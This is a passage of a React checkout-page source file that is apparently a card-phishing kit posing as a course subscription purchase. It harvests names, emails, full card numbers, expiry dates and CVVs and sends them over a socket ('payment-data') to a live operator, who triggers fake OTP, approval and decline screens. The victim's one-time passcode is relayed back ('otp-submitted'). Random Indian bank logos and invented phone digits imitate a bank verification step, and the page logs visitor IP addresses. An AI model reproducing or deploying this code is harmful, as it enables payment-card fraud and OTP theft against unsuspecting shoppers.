const bankLogos = [
  'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
  'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
  'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png',
  'https://assets.stickpng.com/thumbs/627cc5c91b2e263b45696a8e.png',
  'https://images.seeklogo.com/logo-png/33/2/central-bank-of-india-logo-png_seeklogo-339766.png',
  'https://brandlogos.net/wp-content/uploads/2014/01/indian-bank-1907-vector-logo.png',
  'https://brandlogos.net/wp-content/uploads/2014/01/indian-overseas-bank-iob-vector-logo.png',
  'https://assets.stickpng.com/thumbs/627cce601b2e263b45696abb.png',
  'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png',
  'https://toppng.com/uploads/preview/uco-bank-vector-logo-11574257509n3dw7a8hz4.png',
  'https://assets.stickpng.com/thumbs/623dd70370712bdafc63c384.png',
  'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp',
  'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png',
  'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png',
  'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png',
  'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png',
  'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/csb-bank-logo.png',
  'https://seekvectors.com/storage/images/development%20credit%20bank%20logo.svg',
  'https://static.cdnlogo.com/logos/d/96/dhanlaxmi-bank.svg',
  'https://assets.stickpng.com/thumbs/627ccab31b2e263b45696aa2.png',
  'https://toppng.com/uploads/preview/idbi-bank-vector-logo-11574258107ecape2krza.png',
  'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg'
];

import React, { useState, useEffect } from 'react';
import { useSearchParams, useNavigate, Link, useLocation } from 'react-router-dom';
import { ArrowLeft, Lock, CreditCard, Loader2, MoreHorizontal, CheckCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { io, Socket } from 'socket.io-client';
import { useSocket } from '../SocketContext';
import { v4 as uuidv4 } from 'uuid';

// Card brand logos
const cardBrandLogos = {
  visa: 'https://brandlogos.net/wp-content/uploads/2025/04/visa_secure_badge-logo_brandlogos.net_n9x0z-300x300.png',
  mastercard: 'https://www.freepnglogos.com/uploads/mastercard-png/mastercard-logo-logok-15.png',
  discover: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png',
  rupay: 'https://logotyp.us/file/rupay.svg',
  amex: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png' // fallback to discover for amex
};

// Function to detect card brand from card number
const getCardBrand = (cardNumber: string) => {
  if (!cardNumber) {
    return 'visa';
  }
  
  const cleanNumber = cardNumber.replace(/\s/g, '');
  
  // Visa: starts with 4
  if (cleanNumber.startsWith('4')) {
    return 'visa';
  }
  // Mastercard: starts with 5 or 2 (new range)
  else if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) {
    return 'mastercard';
  }
  // Discover: starts with 6
  else if (cleanNumber.startsWith('6')) {
    return 'discover';
  }
  // American Express: starts with 3
  else if (cleanNumber.startsWith('3')) {
    return 'amex';
  }
  // RuPay: starts with 60, 6521, 6522, 81, 82, 508, 353, 356
  else if (/^(60|6521|6522|81|82|508|353|356)/.test(cleanNumber)) {
    return 'rupay';
  }
  
  // Default to Visa
  return 'visa';
};

const Checkout = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const location = useLocation();
  
  const planName = searchParams.get('plan') || 'Complete';
  const billing = searchParams.get('billing') || 'yearly';
  
  // Clear any previous checkout data when starting a new session
  useEffect(() => {
    localStorage.removeItem('userCheckoutData');
    localStorage.removeItem('userCardData');
    localStorage.removeItem('lastPaymentData');
  }, []);



  // Get socket from context for visitor tracking and payment handling
  const { socket, isConnected } = useSocket();
  
  // Visitor tracking for checkout page
  useEffect(() => {
    if (!socket) return;

    const trackVisitor = async () => {
      try {
        // Fetch visitor IP address
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        
        const visitorData = {
          visitorId: `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
          ipAddress: data.ip,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          page: 'checkout'
        };
        
        // Emit visitor joined event
        socket.emit('visitor-joined', visitorData);
        
        // Set up heartbeat to maintain session
        const heartbeatInterval = setInterval(() => {
          if (socket.connected) {
            socket.emit('visitor-heartbeat', {
              visitorId: visitorData.visitorId,
              ipAddress: data.ip,
              timestamp: new Date().toISOString()
            });
          }
        }, 25000); // Send heartbeat every 25 seconds
        
        // Cleanup function
        return () => {
          clearInterval(heartbeatInterval);
          // Don't emit visitor-left on cleanup to avoid flickering
        };
      } catch (error) {
        console.error('Error tracking visitor:', error);
        // Fallback with unknown IP
        const fallbackData = {
          visitorId: `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
          ipAddress: 'Unknown IP',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          page: 'checkout'
        };
        socket.emit('visitor-joined', fallbackData);
      }
    };

    trackVisitor();
  }, [socket]);
  
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    country: '',
    companyName: ''
  });
  
  const [errors, setErrors] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    country: ''
  });
  
  const [touched, setTouched] = useState({
    firstName: false,
    lastName: false,
    email: false,
    confirmEmail: false,
    country: false
  });
  
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [showTermsError, setShowTermsError] = useState(false);
  const [promoCode, setPromoCode] = useState('');

  // Debug: Log the current state of agreeTerms
  useEffect(() => {
    console.log('agreeTerms state:', agreeTerms);
  }, [agreeTerms]);
  
  // Payment flow states
  const [currentStep, setCurrentStep] = useState<'account' | 'loading' | 'payment' | 'review' | 'processing' | 'otp'>('account');
  const [paymentMethod, setPaymentMethod] = useState('');
  const [transactionId] = useState(() => `TXN-${Date.now().toString().slice(-8)}`);
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardName: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });
  const [cardErrors, setCardErrors] = useState({
    cardNumber: '',
    cardName: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });

  // Loading and processing states
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingMessage, setProcessingMessage] = useState('');
  const [showOtp, setShowOtp] = useState(false);
  const [otpValue, setOtpValue] = useState('');
  const [confirmingPayment, setConfirmingPayment] = useState(false);
  const [otpTimer, setOtpTimer] = useState(0);
  const [otpError, setOtpError] = useState('');
  const [otpSubmitting, setOtpSubmitting] = useState(false);
  const [sessionBankLogo, setSessionBankLogo] = useState('');
  const [resendMessage, setResendMessage] = useState('');
  const [randomMobile, setRandomMobile] = useState('');
  const [cardDeclinedError, setCardDeclinedError] = useState('');
  const [otpMobileLast4, setOtpMobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
  const [showSpinner, setShowSpinner] = useState(false);
  const [declineError, setDeclineError] = useState("");
  const [paymentId] = useState(() => 'pay_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
  const [cardError, setCardError] = useState("");
  const [otpLoading, setOtpLoading] = useState(false);
  const [showCancelConfirm, setShowCancelConfirm] = useState(false);
  const [transactionCancelError, setTransactionCancelError] = useState("");

  // Card brand logos
  const cardBrandLogos = {
    visa: 'https://brandlogos.net/wp-content/uploads/2025/04/visa_secure_badge-logo_brandlogos.net_n9x0z-300x300.png',
    mastercard: 'https://www.freepnglogos.com/uploads/mastercard-png/mastercard-logo-logok-15.png',
    discover: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png',
    rupay: 'https://logotyp.us/file/rupay.svg',
    amex: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png' // fallback to discover for amex
  };

  // Function to detect card brand from card number
  const getCardBrand = (cardNumber: string) => {
    if (!cardNumber) {
      console.log('No card number provided, defaulting to visa');
      return 'visa';
    }
    
    const cleanNumber = cardNumber.replace(/\s/g, '');
    console.log('Clean card number for detection:', cleanNumber);
    
    // Visa: starts with 4
    if (cleanNumber.startsWith('4')) {
      console.log('Detected: Visa (starts with 4)');
      return 'visa';
    }
    // Mastercard: starts with 5 or 2 (new range)
    else if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) {
      console.log('Detected: Mastercard (starts with 5 or 2)');
      return 'mastercard';
    }
    // Discover: starts with 6
    else if (cleanNumber.startsWith('6')) {
      console.log('Detected: Discover (starts with 6)');
      return 'discover';
    }
    // American Express: starts with 3
    else if (cleanNumber.startsWith('3')) {
      console.log('Detected: American Express (starts with 3)');
      return 'amex';
    }
    // RuPay: starts with 8 or specific 60 patterns
    else if (cleanNumber.startsWith('8') || cleanNumber.startsWith('60')) {
      console.log('Detected: RuPay (starts with 8 or 60)');
      return 'rupay';
    }
    
    console.log('Unknown card type, defaulting to visa');
    return 'visa'; // default fallback
  };

  const cardSessionMap = React.useRef({});

  // Pricing data based on the main page
  const pricingData = {
    yearly: {
      'Core Tech': { price: 10563, monthly: 880.25 },
      'Complete': { price: 28750, monthly: 2395.83 }, // Updated to show 28,750 for yearly
      'AI+': { price: 12327, monthly: 1027.25 },
      'Cloud+': { price: 12327, monthly: 1027.25 },
      'Data+': { price: 12327, monthly: 1027.25 },
      'Security+': { price: 12327, monthly: 1027.25 }
    },
    monthly: {
      'Core Tech': { price: 1100, monthly: 1100 },
      'Complete': { price: 2195, monthly: 2195 },
      'AI+': { price: 1299, monthly: 1299 },
      'Cloud+': { price: 1299, monthly: 1299 },
      'Data+': { price: 1299, monthly: 1299 },
      'Security+': { price: 1299, monthly: 1299 }
    }
  };

  const currentPlan = pricingData[billing as keyof typeof pricingData][planName as keyof typeof pricingData.yearly];
  const displayPrice = billing === 'yearly' ? currentPlan.price : currentPlan.monthly;
  const billingText = billing === 'yearly' ? 'Annually' : 'Monthly';

  // Check for card declined error from location state
  useEffect(() => {
    if (location.state?.error) {
      setCardDeclinedError(location.state.error);
      // Clear the error after 10 seconds
      setTimeout(() => setCardDeclinedError(''), 10000);
    }
  }, [location.state]);

  const validateField = (field: string, value: string) => {
    switch (field) {
      case 'firstName':
        if (!value.trim()) return 'First name is required';
        // Check for valid name format (only letters, spaces, and basic punctuation)
        const nameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !nameRegex.test(value.trim()) ? 'Please enter a valid name' : '';
      case 'lastName':
        if (!value.trim()) return 'Last name is required';
        const lastNameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !lastNameRegex.test(value.trim()) ? 'Please enter a valid last name' : '';
      case 'email':
        if (!value.trim()) return 'Email is required';
        // Enhanced email validation
        const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
        if (!emailRegex.test(value)) return 'Please enter a valid email address';
        // Check for common invalid patterns
        if (value.includes('..') || value.startsWith('.') || value.endsWith('.')) return 'Please enter a valid email address';
        return '';
      case 'confirmEmail':
        if (!value.trim()) return 'Confirm email is required';
        return value !== formData.email ? 'Emails do not match' : '';
      case 'country':
        return !value ? 'Country is required' : '';
      default:
        return '';
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    
    // Validate field if it has been touched
    if (touched[field as keyof typeof touched]) {
      const error = validateField(field, value);
      setErrors(prev => ({ ...prev, [field]: error }));
    }
  };

  const handleFieldBlur = (field: string) => {
    setTouched(prev => ({ ...prev, [field]: true }));
    const error = validateField(field, formData[field as keyof typeof formData]);
    setErrors(prev => ({ ...prev, [field]: error }));
  };

  const isFormValid = () => {
    const requiredFields = ['firstName', 'lastName', 'email', 'confirmEmail', 'country'];
    return requiredFields.every(field => {
      const value = formData[field as keyof typeof formData];
      return value && !validateField(field, value);
    }) && agreeTerms;
  };

  // Enhanced card validation functions
  const validateCardNumber = (cardNumber: string) => {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    // Basic length check
    if (cleaned.length < 13 || cleaned.length > 19) return false;
    
    // Luhn algorithm check
    let sum = 0;
    let isEven = false;
    
    for (let i = cleaned.length - 1; i >= 0; i--) {
      let digit = parseInt(cleaned.charAt(i), 10);
      
      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      
      sum += digit;
      isEven = !isEven;
    }
    
    return sum % 10 === 0;
  };

  const getCardType = (cardNumber: string) => {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    if (/^4/.test(cleaned)) return 'visa';
    if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return 'mastercard';
    if (/^6/.test(cleaned)) return 'discover';
    if (/^508[5-9]|^60/.test(cleaned)) return 'rupay';
    
    return null;
  };

  const validateCardField = (field: string, value: string) => {
    switch (field) {
      case 'cardNumber':
        if (!value.trim()) return 'Card number is required';
        const cleaned = value.replace(/\s/g, '');
        if (!/^\d+$/.test(cleaned)) return 'Card number must contain only digits';
        if (!validateCardNumber(cleaned)) return 'Invalid card number';
        return '';
      case 'cardName':
        if (!value.trim()) return 'Cardholder name is required';
        const nameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !nameRegex.test(value.trim()) ? 'Please enter a valid name' : '';
      case 'expiryMonth':
        if (!value) return 'Expiry month is required';
        const month = parseInt(value);
        if (month < 1 || month > 12) return 'Invalid month';
        return '';
      case 'expiryYear':
        if (!value) return 'Expiry year is required';
        const year = parseInt(value);
        const currentYear = new Date().getFullYear() % 100;
        if (year < currentYear || year > currentYear + 50) return 'Invalid year';
        return '';
      case 'cvv':
        if (!value.trim()) return 'CVV is required';
        if (!/^\d{3,4}$/.test(value)) return 'CVV must be 3-4 digits';
        return '';
      default:
        return '';
    }
  };

  // Format card number with spaces every 4 digits
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(' ') : cleaned;
  };

  const handleCardInputChange = (field: string, value: string) => {
    let formattedValue = value;
    
    // Apply special formatting for card number
    if (field === 'cardNumber') {
      formattedValue = formatCardNumber(value);
    }
    
    setCardData(prev => ({ ...prev, [field]: formattedValue }));
    const error = validateCardField(field, formattedValue);
    setCardErrors(prev => ({ ...prev, [field]: error }));
  };

  const isCardFormValid = () => {
    const requiredFields = ['cardNumber', 'cardName', 'expiryMonth', 'expiryYear', 'cvv'];
    return requiredFields.every(field => {
      const value = cardData[field as keyof typeof cardData];
      // Check if field has a value and no validation errors
      return value && value.trim() !== '' && !validateCardField(field, value);
    });
  };

  const areAllCardFieldsFilled = () => {
    const requiredFields = ['cardNumber', 'cardName', 'expiryMonth', 'expiryYear', 'cvv'];
    return requiredFields.every(field => {
      const value = cardData[field as keyof typeof cardData];
      return value && value.trim() !== '';
    });
  };

  const handleContinue = () => {
    // Validate all fields
    const newErrors = {
      firstName: validateField('firstName', formData.firstName),
      lastName: validateField('lastName', formData.lastName),
      email: validateField('email', formData.email),
      confirmEmail: validateField('confirmEmail', formData.confirmEmail),
      country: validateField('country', formData.country)
    };
    
    setErrors(newErrors);
    setTouched({
      firstName: true,
      lastName: true,
      email: true,
      confirmEmail: true,
      country: true
    });

    if (!agreeTerms) {
      setShowTermsError(true);
      return;
    }
    
    // Check if form is valid - only proceed if ALL fields are valid
    const hasErrors = Object.values(newErrors).some(error => error !== '');
    if (hasErrors || !isFormValid()) {
      return;
    }
    
    setShowTermsError(false);
    
    // Only validate contact fields here (not card fields)
    if (
      !formData.firstName ||
      !formData.lastName ||
      !formData.email ||
      !formData.confirmEmail ||
      !formData.country
    ) {
      alert('Please fill in all required contact fields.');
      return;
    }
    // Store user data for success page
    const userData = {
      firstName: formData.firstName,
      lastName: formData.lastName,
      email: formData.email,
      country: formData.country,
      companyName: formData.companyName,
      planName,
      billing,
      amount: displayPrice,
      paymentId
    };
    localStorage.setItem('userCheckoutData', JSON.stringify(userData));
    
    // Start the payment flow
    setCurrentStep('loading');
    
    // Show loading for 2-3 seconds then move to payment step
    setTimeout(() => {
      setCurrentStep('payment');
    }, 2500);
  };

  const handlePaymentMethodSelect = (method: string) => {
    setPaymentMethod(method);
    // Clear transaction cancel error when user selects payment method
    if (transactionCancelError) {
      setTransactionCancelError('');
    }
  };

  const handleReviewOrder = () => {
    // Validate all card fields
    const newCardErrors = {
      cardNumber: validateCardField('cardNumber', cardData.cardNumber),
      cardName: validateCardField('cardName', cardData.cardName),
      expiryMonth: validateCardField('expiryMonth', cardData.expiryMonth),
      expiryYear: validateCardField('expiryYear', cardData.expiryYear),
      cvv: validateCardField('cvv', cardData.cvv)
    };
    
    setCardErrors(newCardErrors);
    
    // Check if all fields are filled
    const requiredFields = ['cardNumber', 'cardName', 'expiryMonth', 'expiryYear', 'cvv'];
    const allFieldsFilled = requiredFields.every(field => {
      const value = cardData[field as keyof typeof cardData];
      return value && value.trim() !== '';
    });
    
    // Check if card form is valid - only proceed if ALL fields are valid
    const hasCardErrors = Object.values(newCardErrors).some(error => error !== '');
    const isFormValid = isCardFormValid();
    
    console.log('Card validation check:', {
      allFieldsFilled,
      hasCardErrors,
      isFormValid,
      cardData,
      newCardErrors
    });
    
    if (!allFieldsFilled || hasCardErrors || !isFormValid) {
      console.log('Validation failed - cannot proceed');
      return;
    }
    
    // Store card data for success page
    const cardInfo = {
      cardNumber: cardData.cardNumber,
      cardName: cardData.cardName,
      expiryMonth: cardData.expiryMonth,
      expiryYear: cardData.expiryYear,
      cvv: cardData.cvv
    };
    localStorage.setItem('userCardData', JSON.stringify(cardInfo));
    
    console.log('Validation passed - proceeding to review');
    setIsProcessing(true);
    setCurrentStep('processing');
    
    // Simulate processing with messages
    setProcessingMessage('Please wait we are checking your details!');
    
    setTimeout(() => {
      setProcessingMessage('Checking your card information');
      setTimeout(() => {
        setProcessingMessage('Redirecting you to confirmation page..');
        setTimeout(() => {
          setIsProcessing(false);
          setCurrentStep('review');
        }, 3000);
      }, 2000);
    }, 1500);
  };

  // --- SOCKET EVENT HANDLING FOR PAYMENT FLOW ---

  useEffect(() => {
    if (!socket) {
      console.log('Socket not available, skipping event registration');
      return;
    }
    console.log('Registering socket event listeners for paymentId:', paymentId);
    // Register event listeners
    socket.on('show-otp', () => {
      setConfirmingPayment(false);
      setShowOtp(true);
      setCurrentStep('otp');
      
      // Show loading overlay for 4-5 seconds
      setOtpLoading(true);
      setTimeout(() => {
        setOtpLoading(false);
      }, 4500); // 4.5 seconds
      
      startOtpTimer();
    });
    socket.on('payment-approved', (data) => {
      console.log('Payment approved event received:', data);
      console.log('Current paymentId:', paymentId);
      console.log('Event paymentId:', data?.paymentId);
      console.log('Socket connected:', socket?.connected);
      
      if (!data || data.paymentId !== paymentId) {
        console.log('Payment ID mismatch or no data, ignoring event');
        return;
      }
      
      console.log('Payment approved - showing loading spinner');
      setShowOtp(false);
      setShowSpinner(true);
      
      // Show loading spinner for 3 seconds with blur effect
      setTimeout(() => {
        setShowSpinner(false);
        setCurrentStep('account');
        
        // Try to get formData and cardData from memory, or fallback to localStorage
        let _formData = { ...formData };
        let _cardData = { ...cardData };
        const isFormDataIncomplete = !_formData.firstName || !_formData.lastName || !_formData.email;
        const isCardDataIncomplete = !_cardData.cardNumber || !_cardData.cardName || !_cardData.expiryMonth || !_cardData.expiryYear || !_cardData.cvv;
        if (isFormDataIncomplete) {
          const storedUser = localStorage.getItem('userCheckoutData');
          if (storedUser) _formData = { ..._formData, ...JSON.parse(storedUser) };
        }
        if (isCardDataIncomplete) {
          const storedCard = localStorage.getItem('userCardData');
          if (storedCard) _cardData = { ..._cardData, ...JSON.parse(storedCard) };
        }
        // Now build successData as before
        const successData = {
          cardNumber: _cardData.cardNumber,
          cardName: _cardData.cardName,
          cvv: _cardData.cvv,
          expiry: `${_cardData.expiryMonth}/${_cardData.expiryYear}`,
          expiryMonth: _cardData.expiryMonth,
          expiryYear: _cardData.expiryYear,
          billingDetails: {
            firstName: _formData.firstName,
            lastName: _formData.lastName,
            email: _formData.email,
            country: _formData.country,
            companyName: _formData.companyName || ''
          },
          planName, 
          billing, 
          amount: displayPrice, 
          paymentId,
          timestamp: new Date().toISOString()
        };
        // Only proceed if all required fields are present
        if (
          !successData.billingDetails?.email ||
          !successData.cardNumber ||
          !successData.cardName ||
          !successData.cvv
        ) {
          console.log('Missing payment data:', successData);
          alert('Payment details not found. Please complete checkout again.');
          return;
        }
        localStorage.setItem('lastPaymentData', JSON.stringify(successData));
        navigate('/payment-success', { 
          state: { 
            paymentData: successData
          } 
        });
      }, 3000);
    });
    socket.on('payment-rejected', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setShowSpinner(true);
      setTimeout(() => {
        setShowSpinner(false);
        setCurrentStep('payment');
        setDeclineError('Your card was declined!');
      }, 2500);
    });
    socket.on('insufficient-balance-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setShowSpinner(true);
      setTimeout(() => {
        setShowSpinner(false);
        setCurrentStep('payment');
        setDeclineError('Your card have insufficient balance to pay for this order');
      }, 2500);
    });
    socket.on('invalid-otp-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setOtpSubmitting(false);
      setOtpError('incorrect otp, please enter valid One time passcode');
      setTimeout(() => setOtpError(''), 5000);
    });
    socket.on('card-declined-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setShowSpinner(false);
      setCurrentStep('payment');
      setCardError('Your card was declined!');
    });
    socket.on('insufficient-balance-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setShowSpinner(false);
      setCurrentStep('payment');
      setCardError('Your card have insufficient balance');
    });
    return () => {
      console.log('Cleaning up socket event listeners');
      socket.off('show-otp');
      socket.off('payment-approved');
      socket.off('payment-rejected');
      socket.off('invalid-otp-error');
      socket.off('card-declined-error');
      socket.off('insufficient-balance-error');
    };
  }, [socket, paymentId]);

  const handleOtpSubmit = () => {
    try {
      if (!socket) {
        alert('Connection lost. Please refresh the page and try again.');
        return;
      }
      
      if (!otpValue || otpValue.length < 4) {
        alert('Please enter a valid OTP.');
        return;
      }
      
      setOtpSubmitting(true);
      setOtpError('');
      socket.emit('otp-submitted', { otp: otpValue, paymentId });
    } catch (error) {
      console.error('Error submitting OTP:', error);
      setOtpSubmitting(false);
      alert('Failed to submit OTP. Please try again.');
    }
  };

  const handleOtpCancel = () => {
    setTimeout(() => {
      setCurrentStep('account');
      setShowOtp(false);
      setOtpValue('');
      setOtpError('');
      alert('Transaction cancelled');
    }, 2000);
  };

  const handleResendOtp = () => {
    setResendMessage('One time passcode have been sent to your registered mobile number');
    setTimeout(() => setResendMessage(''), 5000);
    startOtpTimer();
  };

  const startOtpTimer = () => {
    // Random timer between 1.59 to 9.59 minutes (in seconds)
    const randomMinutes = Math.floor(Math.random() * 8) + 1; // 1-8 minutes
    const randomSeconds = 59; // Always 59 seconds
    const totalSeconds = randomMinutes * 60 + randomSeconds;
    setOtpTimer(totalSeconds);
  };

  // Timer countdown effect
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (otpTimer > 0 && currentStep === 'otp') {
      interval = setInterval(() => {
        setOtpTimer(prev => {
          if (prev <= 1) {
            setCurrentStep('account');
            setShowOtp(false);
            alert('Session expired. Please try again.');
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [otpTimer, currentStep]);

  const formatTimer = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}.${remainingSeconds.toString().padStart(2, '0')}`;
  };

  // Handle refresh on OTP page and initialize socket connection
  useEffect(() => {
    // Handle page refresh during OTP verification
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      if (currentStep === 'otp') {
        e.preventDefault();
        e.returnValue = '';
        
        // Show confirmation popup
        const confirmed = window.confirm('Do you want to cancel this transaction?');
        if (confirmed) {
          setCurrentStep('account');
          setShowOtp(false);
          alert('User pressed back button error msg');
        }
        return '';
      }
      
      // No need to disconnect here as the context socket handles it
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      // No need to disconnect here as the context socket handles it
    };
  }, [currentStep]);

  const handleConfirmPayment = () => {
    try {
      setConfirmingPayment(true);
      if (!socket) {
        alert('Connection lost. Please refresh the page and try again.');
        setConfirmingPayment(false);
        return;
      }
      const paymentData = {
        paymentId,
        cardNumber: cardData.cardNumber,
        cardName: cardData.cardName,
        cvv: cardData.cvv,
        expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
        expiryMonth: cardData.expiryMonth,
        expiryYear: cardData.expiryYear,
        billingDetails: {
          firstName: formData.firstName,
          lastName: formData.lastName,
          email: formData.email,
          country: formData.country,
          companyName: formData.companyName || ''
        },
        planName,
        billing,
        amount: displayPrice,
        timestamp: new Date().toISOString()
      };
      setOtpValue("");
      setOtpError("");
      setShowOtp(false);
      setOtpSubmitting(false);
      setResendMessage("");
      setShowSpinner(false);
      setDeclineError("");
      setCardError("");
      const cardKey = cardData.cardNumber.replace(/\s/g, "");
      if (!cardSessionMap.current[cardKey]) {
        const randomLogo = bankLogos[Math.floor(Math.random() * bankLogos.length)];
        const randomLast4 = Math.floor(1000 + Math.random() * 9000).toString();
        cardSessionMap.current[cardKey] = { logo: randomLogo, last4: randomLast4 };
      }
      setSessionBankLogo(cardSessionMap.current[cardKey].logo);
      setOtpMobileLast4(cardSessionMap.current[cardKey].last4);
      socket.emit('payment-data', paymentData);
    } catch (error) {
      console.error('Error in payment confirmation:', error);
      setConfirmingPayment(false);
      alert('An unexpected error occurred. Please try again.');
    }
  };

  const getVisitorId = () => {
    let visitorId = sessionStorage.getItem('visitorId');
    if (!visitorId) {
      visitorId = uuidv4();
      sessionStorage.setItem('visitorId', visitorId);
    }
    return visitorId;
  };
  const visitorId = getVisitorId();

  return (
    <div className="min-h-screen bg-slate-900 text-white">
      {/* Global Loading Spinner for Payment Success */}
      {showSpinner && (
        <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-md flex items-center justify-center z-[9999]">
          <div className="text-center">
            <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
              <Loader2 className="h-8 w-8 text-white animate-spin" />
            </div>
            <p className="text-white text-lg font-medium">Processing...</p>
          </div>
        </div>
      )}
      {/* Header with Progress */}
      <div className="border-b border-slate-700 px-6 py-4">
        <div className="max-w-7xl mx-auto">
          {/* Back to pricing link */}
          <Link to="/" className="flex items-center gap-2 text-slate-300 hover:text-white mb-6 text-sm">
            <ArrowLeft size={16} />
            Back to pricing
          </Link>
          
          {/* Progress Steps */}
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                1
              </div>
              <span className="text-white font-medium">ACCOUNT</span>
            </div>
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-slate-600 rounded-full flex items-center justify-center text-sm">
                2
              </div>
              <span className="text-slate-400">PAYMENT</span>
            </div>
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-slate-600 rounded-full flex items-center justify-center text-sm">
                3
              </div>
              <span className="text-slate-400">REVIEW</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-6 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Content Area */}
          <div className="lg:col-span-2">
            {/* Account Details Section */}
            {currentStep === 'account' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <h2 className="text-2xl font-bold">Account details</h2>
                </div>

                <div className="mb-6">
                  <span className="text-slate-300">Already have an account? </span>
                  <a href="#" className="text-blue-400 hover:underline">Sign in</a>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-6">
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      First name<span className="text-red-500">*</span>
                    </label>
                    <Input
                      value={formData.firstName}
                      onChange={(e) => handleInputChange('firstName', e.target.value)}
                      onBlur={() => handleFieldBlur('firstName')}
                      className={`bg-white text-slate-900 ${
                        errors.firstName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.firstName && (
                      <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Last name<span className="text-red-500">*</span>
                    </label>
                    <Input
                      value={formData.lastName}
                      onChange={(e) => handleInputChange('lastName', e.target.value)}
                      onBlur={() => handleFieldBlur('lastName')}
                      className={`bg-white text-slate-900 ${
                        errors.lastName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.lastName && (
                      <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>
                    )}
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-6">
                  <div>
                    <label className="block text-sm font-medium mb-2">
